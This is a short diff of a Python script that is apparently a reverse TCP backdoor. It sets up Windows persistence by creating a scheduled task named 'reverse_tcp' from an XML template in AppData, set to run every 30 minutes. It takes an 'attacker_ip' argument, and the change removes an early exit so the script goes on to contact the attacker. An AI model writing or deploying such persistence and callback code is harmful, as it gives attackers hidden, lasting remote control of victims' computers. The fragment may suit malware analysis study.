@@ -90,13 +90,8 @@ if (platform.system() == "Windows"):
         ### Run every 30 minutes.
         ### The the name of schedule task is reverse_tcp
         os.system("schtasks /CREATE /XML " + appdata_path + "\\schtasks_template.xml /TN reverse_tcp")
-        ## os.system("schtasks /CREATE /SC MINUTE /MO 30 /TN reverse_tcp /TR %Appdata%\\reverse_tcp.exe")
 
-        ### As the scheduled task already starts, no need to connect to attacker now.
-        ### It will connect automatically soon.
-        sys.exit(0)
-
-
+        
 if len(sys.argv) >= 2:
     attacker_ip = sys.argv[1]       ## get attacker's ip from command line
 else:
